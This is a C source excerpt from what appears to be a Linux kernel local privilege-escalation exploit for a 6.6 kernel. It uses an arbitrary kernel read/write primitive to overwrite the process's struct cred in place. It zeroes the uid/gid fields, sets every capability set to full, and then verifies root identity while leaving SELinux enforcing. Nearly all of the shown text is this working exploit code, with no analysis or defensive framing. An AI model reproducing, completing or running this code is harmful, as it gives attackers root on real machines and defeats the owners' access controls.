...
void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core((size_t)consumer_root_cpu);
...
/*
 * struct cred layout for the target 6.6 kernel.  The direct primitive only
 * writes one qword at a time, so the four uid/gid pairs are covered by four
 * qwords and securebits is written as a zero qword (the following four-byte
 * padding is not part of the capability fields).  The security pointer at
 * +128 is deliberately absent from this table.
 */
#define CRED_UID_OFF 8
#define CRED_SECUREBITS_OFF 40
#define CRED_CAPS_OFF 48
#define CRED_SECURITY_OFF 128
#define CRED_CAP_FULL UINT64_C(0x000001ffffffffff)

static int direct_read_qword_retry(
    const char *name, uintptr_t target, uint64_t *value, int *write_idx) {
  if (!value || !write_idx || !is_kernel_ptr(target) ||
      (target & 7) != 0) {
    pr_error("direct-r64-fatal name=%s reason=bad-read-target target=%016zx\n",
             name, target);
    return 0;
  }
  ...
  for (int attempt = 1; attempt <= DIRECT_WRITE_ATTEMPTS; attempt++) {
    int rr = direct_read_shape0_exact64_once(
        target, value, name, attempt, write_idx);
    if (rr == DIRECT_R64_RETRY) {
      continue;
    }
    return rr == DIRECT_R64_OK;
  }

  pr_error("direct-r64-fatal name=%s reason=retry-exhausted target=%016zx\n",
           name, target);
  return 0;
}

static int direct_cred_ptr_valid(uintptr_t cred) {
  return cred != 0 && is_direct_ptr(cred) && (cred & 7) == 0 &&
         cred <= UINTPTR_MAX - (CRED_CAPS_OFF + 32);
}

static int direct_cred_patch_inplace(
    const char *name, uintptr_t cred, int *write_idx) {
  static const struct {
    uintptr_t offset;
    uintptr_t value;
    const char *field;
  } fields[] = {
    {CRED_UID_OFF + 0, 0, "uid_gid_0"},
    {CRED_UID_OFF + 8, 0, "uid_gid_1"},
    {CRED_UID_OFF + 16, 0, "uid_gid_2"},
    {CRED_UID_OFF + 24, 0, "uid_gid_3"},
    {CRED_SECUREBITS_OFF, 0, "securebits"},
    {CRED_CAPS_OFF + 0, CRED_CAP_FULL, "cap_inheritable"},
    {CRED_CAPS_OFF + 8, CRED_CAP_FULL, "cap_permitted"},
    {CRED_CAPS_OFF + 16, CRED_CAP_FULL, "cap_effective"},
    {CRED_CAPS_OFF + 24, CRED_CAP_FULL, "cap_bounding"},
    {CRED_CAPS_OFF + 32, CRED_CAP_FULL, "cap_ambient"},
  };

  if (!write_idx || !direct_cred_ptr_valid(cred)) {
    pr_error("direct-cred-fatal name=%s reason=bad-cred-pointer cred=%016zx\n",
             name, cred);
    return 0;
  }

  pr_success("direct-cred-inplace name=%s cred=%016zx security_preserved=1 "
             "security_offset=%u\n",
             name, cred, CRED_SECURITY_OFF);
  for (size_t i = 0; i < sizeof(fields) / sizeof(fields[0]); i++) {
    char step[96];
    snprintf(step, sizeof(step), "%s_%s", name, fields[i].field);
    if (!direct_trigger_write64(
            step, cred + fields[i].offset, fields[i].value, 1, write_idx)) {
      pr_error("direct-cred-fatal name=%s field=%s reason=write-failed\n",
               name, fields[i].field);
      return 0;
    }
  }
...
static int run_direct_root_stage(void) {
  ...
  uint64_t cred = 0;
  pr_success("direct-step before_inplace_cred uid=%u pid=%d task=%016llx\n",
             getuid(), getpid(), (unsigned long long)task);

  if (!direct_read_qword_retry(
          "task_real_cred", real_cred_slot, &real_cred, &write_idx) ||
      !direct_read_qword_retry(
          "task_cred", cred_slot, &cred, &write_idx)) {
    pr_error("direct cred pointer read failed\n");
    return 0;
  }
  if (!direct_cred_ptr_valid((uintptr_t)real_cred) ||
      !direct_cred_ptr_valid((uintptr_t)cred)) {
    pr_error("direct cred pointer validation failed real=%016llx cred=%016llx\n",
             (unsigned long long)real_cred, (unsigned long long)cred);
    return 0;
  }
  pr_success("direct-cred-pointers task=%016llx real_cred=%016llx "
             "cred=%016llx same=%d pointer_slots_preserved=1\n",
             (unsigned long long)task, (unsigned long long)real_cred,
             (unsigned long long)cred, real_cred == cred);

  if (!direct_cred_patch_inplace(
          "real_cred", (uintptr_t)real_cred, &write_idx)) {
    return 0;
  }
  if (cred != real_cred &&
      !direct_cred_patch_inplace("cred", (uintptr_t)cred, &write_idx)) {
    return 0;
  }
  ...
  pr_success("direct credential result uid=%u euid=%u gid=%u egid=%u "
             "task=%016llx real_cred=%016llx cred=%016llx "
             "selinux=%d->%d inplace=1 policy_reload=0\n",
             getuid(), geteuid(), getgid(), getegid(),
             (unsigned long long)task, (unsigned long long)real_cred,
             (unsigned long long)cred, enforcing, enforcing_after);

  int identity_root = getuid() == 0 && geteuid() == 0 &&
                      getgid() == 0 && getegid() == 0;
  ...
  int selinux_preserved = enforcing == enforcing_after && enforcing_after == 1;
  int root_ok = identity_root && id_ok && selinux_preserved;
